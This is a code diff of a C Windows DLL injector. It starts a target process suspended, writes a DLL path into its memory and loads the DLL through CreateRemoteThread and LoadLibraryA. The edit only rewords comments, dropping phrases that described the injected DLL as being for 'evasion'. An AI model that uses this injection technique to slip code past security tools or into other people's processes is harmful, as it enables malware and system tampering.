@@ -24,13 +24,13 @@ int main(int argc, char* argv[]) {
     printf("[+] Launching target: %s\n", targetExe);
     printf("[+] Injecting DLL: %s\n", dllPath);
 
-    // 1. Create the process in a SUSPENDED state (Crucial for early evasion)
+    // Create process in a SUSPENDED state
     if (!CreateProcessA(NULL, targetExe, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
         printf("[-] Failed to start target EXE.\n");
         return 1;
     }
 
-    // 2. Allocate memory inside the target process for the DLL path string
+    // Allocate memory inside target process for DLL path string
     LPVOID remoteBuf = VirtualAllocEx(pi.hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
     if (!remoteBuf) {
         printf("[-] Failed to allocate memory in target process.\n");
@@ -40,7 +40,7 @@ int main(int argc, char* argv[]) {
     
     WriteProcessMemory(pi.hProcess, remoteBuf, (LPVOID)dllPath, strlen(dllPath) + 1, NULL);
 
-    // 3. Create a thread in the target process that calls 'LoadLibraryA'
+    // Create thread in target process that calls 'LoadLibraryA'
     HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, 
         (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA"), 
         remoteBuf, 0, NULL);
@@ -55,7 +55,7 @@ int main(int argc, char* argv[]) {
         printf("[-] Injection failed.\n");
     }
 
-    // 4. Unfreeze the program now that our evasion DLL is inside
+    // Unfreeze the program now that DLL is injected
     printf("[+] Resuming target process execution...\n\n");
     ResumeThread(pi.hThread);
 
